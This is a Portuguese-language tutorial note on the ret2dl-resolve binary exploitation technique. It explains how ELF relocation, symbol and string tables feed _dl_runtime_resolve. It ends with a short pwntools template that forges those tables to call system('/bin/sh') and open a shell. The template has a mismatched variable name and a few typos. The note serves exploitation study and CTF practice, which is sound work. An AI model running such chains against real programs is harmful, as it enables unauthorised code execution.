# Ret2dl-resolve
- [Ret2dl-resolve](#ret2dl-resolve)
- [Teoria](#teoria)
  - [JMPREL](#jmprel)
  - [STRTAB](#strtab)
  - [SYMTAB](#symtab)
  - [Exemplo](#exemplo)
  - [_dl_runtime_resolve](#_dl_runtime_resolve)
- [Exploit](#exploit)
- [Manual](#manual)
- [CTFs](#ctfs)
- [Fontes e créditos](#fontes-e-créditos)

Nos ja sabemos que, quando o programa usa uma função do libc, 
ela terá uma entrada na plt, que somente quando usada sera 
preenchida na got...

Mas e se o programa nao usar uma função, existe algum jeito de 
resolve-la?

# Teoria

A section `.dynamic` contem os dados usados para que `ld.so` 
resolva os símbolos... Voce pode ve-la usando `readelf -d`

```py
$ readelf -d /bin/ls

Dynamic section at offset 0x21a58 contains 28 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libselinux.so.1]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000c (INIT)               0x4000
 0x000000000000000d (FINI)               0x17574
 0x0000000000000019 (INIT_ARRAY)         0x22010
 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x22018
 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
 0x000000006ffffef5 (GNU_HASH)           0x3a0
 0x0000000000000005 (STRTAB)             0x1190
 0x0000000000000006 (SYMTAB)             0x488
 0x000000000000000a (STRSZ)              1612 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x22c58
 0x0000000000000002 (PLTRELSZ)           2544 (bytes)
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000017 (JMPREL)             0x2cb8
 0x0000000000000007 (RELA)               0x1968
 0x0000000000000008 (RELASZ)             4944 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000000000001e (FLAGS)              BIND_NOW
 0x000000006ffffffb (FLAGS_1)            Flags: NOW PIE
 0x000000006ffffffe (VERNEED)            0x18f8
 0x000000006fffffff (VERNEEDNUM)         1
 0x000000006ffffff0 (VERSYM)             0x17dc
 0x000000006ffffff9 (RELACOUNT)          193
 0x0000000000000000 (NULL)               0x0
```

Porem para essa tecnica so precisamos de 3: STRTAB, SYMTAB, JMPREL

## JMPREL
JMPREL (`.rel.plt`) contem a `Relocation Table`. A qual contem o 
endereco dos simbolos realocados. Ela pode ser lida com 
`readelf -r`

Com `Sym.Name` sendo o nome, `Offset` o endereco na GOT, e
`Info e Type` sendo mais alguns metadados

```C
# readelf -r ./babystack

Relocation section '.rel.dyn' at offset 0x2a8 contains 1 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__

Relocation section '.rel.plt' at offset 0x2b0 contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   alarm@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
```

O tipo das entradas é `ELF32_Re1`
```C
typedef uint32_t Elf32_Addr ; 
typedef uint32_t Elf32_Word ; 
typedef struct 
{
   Elf32_Addr r_offset ; /* Address */ 
   Elf32_Word r_info ; /* Relocation type and symbol index */ 
} Elf32_Rel ; 
#define ELF32_R_SYM(val) ((val) >> 8) 
#define ELF32_R_TYPE(val) ((val) & 0xff)
```
Por exemplo para:
```
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
```
- ELF32_R_SYM(r_info) == 1 
  - 0x0107 >> 8 == 1 
- ELF32_R_TYPE(r_info) == 7 (R_386_JUMP_SLOT)
  - 0x0107 && 0xff = 0x0007

## STRTAB
STRTAB é uma table que armazena as strings para os nomes dos 
símbolos
```C
gdb> x/10s 0x804822c # Endereço STRTAB
0x804822c:	""
0x804822d:	"libc.so.6"
0x8048237:	"_IO_stdin_used"
0x8048246:	"read"
0x804824b:	"alarm"
0x8048251:	"__libc_start_main"
0x8048263:	"__gmon_start__"
0x8048272:	"GLIBC_2.0"
```
## SYMTAB 
SYMTAB é uma table que armazena `ELF32_Sym`... 

O qual contem `st_name`: o offset do nome do simbolo dentro da 
STRTAB

```C
typedef struct 
{ 
   Elf32_Word st_name ; /* Symbol name (string tbl index) */
   Elf32_Addr st_value ; /* Symbol value */ 
   Elf32_Word st_size ; /* Symbol size */ 
   unsigned char st_info ; /* Symbol type and binding */ 
   unsigned char st_other ; /* Symbol visibility under glibc>=2.2 */ 
   Elf32_Section st_shndx ; /* Section index */ 
} Elf32_Sym ;
```

`st_name` é o primeiro membro do struct

Nos podemos saber qual o index do nosso simbolo na SYMTAB, 
usando a macro `ELF32_R_SYM`

## Exemplo
Portanto:

- JMPREL - r_value (que vira o index na SYMTAB), endereço na GOT
- STRTAB - Armazena os nomes
- SYMTAB - pointer para o nome na STRTAB

Por exemplo para a seguinte entrada na JMPREL:
```
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
```
- ELF32_R_SYM(r_info) == 1 
  - 0x0107 >> 8 == 1 
- ELF32_R_TYPE(r_info) == 7 (R_386_JUMP_SLOT)
  - 0x0107 && 0xff = 0x0007

O R_SYM (1) é o offset da entrada no simbolo na 
table SYMTAB, que pode ser usado:
```
0x80481cc  +   1   * 16
SYMTAB     + index * sizeof(entry)) 
```
Checando esse endereço, nos temos o struct referente a 
aquele simbolo, e portanto no mesmo endereço o `st_name`

Vamos supor que nesse caso, `st_name = 0x1a`

Agora podemos ver o nome do simbolo no STRTAB
```C
x/s 0x804822c   +   0x1a
    STRTAB      +   st_name
0x8048246:	"read"
```
## _dl_runtime_resolve
Agora, como funciona a resolução de símbolos?

Ver qual a entrada da GOT referente ao simbolo e pular para PLT
```x86asm
read@plt:
   jmp    DWORD PTR ds:0x804a00c
   push   0x0
   jmp    0x80482f0
```
Na PLT, push em `reloc_offset` e ir para o resolvedor

Agora o resolvedor (`dl-resolve()`) ira usar o `reloc_offset`
para preencher as os campos de relocação e na SYMTAB

```C++
_dl_runtime_resolve ( link_map , rel_offset );
Com:
    link_map   =  lista com todas as libs carregadas
                  _dl_runtime_resolve vai usada-las 
                  para resolver os símbolos

    rel_offset =  Offset de Elf32_Rel na JMPREL

o simbolo sera relocados a função original sera chamada :D

// call nao resolvida de read(0, buf, 0x100)
_dl_runtime_resolve(link_map, rel_offset) {

    // Encontrar na JMPREL usando o offset (type = Elf32_Rel) 
    rel_entry = JMPREL + rel_offset ;

    // Encontrar na SYMTAB usando r_info (type = Elf32_Sym)
    sym_entry = &SYMTAB [ ELF32_R_SYM ( rel_entry -> r_info )];

    // Encontrar nome na STRTAB usando st_name (type = char* / string)
    sym_name = STRTAB + sym_entry -> st_name ;

    // Usar o nome para encontrar o simbolo na lista de libs
    _search_for_symbol_(link_map, sym_name);

    // call read, ja que o simbolo foi resolvido
    read(0, buf, 0x100);
}
```
# Exploit

Nos podemos usar o helper do pwntools para facilmente gerar as 
tables com offsets corretos e tudo mais. Caso vc tenha 
curiosidade, pode ler a proxima seção ...

Porem, no pwntools podemos automar isso usando:
```py
elf = ELF('./vuln')
io = process(elf.path)
rop = ROP(elf)

payload = Ret2dlresolvePayload(
  elf,
  symbol='system',
  args=['/bin/sh']
)

rop.raw('A' * pad)
rop.read(0, dlresolve.data_addr) # criar tables falsas
rop.ret2dlresolve(dlresolve) # chamar dl-resolve() com reloc_offset falso

io.sendline(rop.chain()) # A chain vai chamar read de novo, para enviar as tables
io.sendline(dlresolve.payload)

io.interactive()
```

# Manual

# CTFs

# Fontes e créditos
- https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62#5-_dl_runtime_resolve
- https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve
- https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation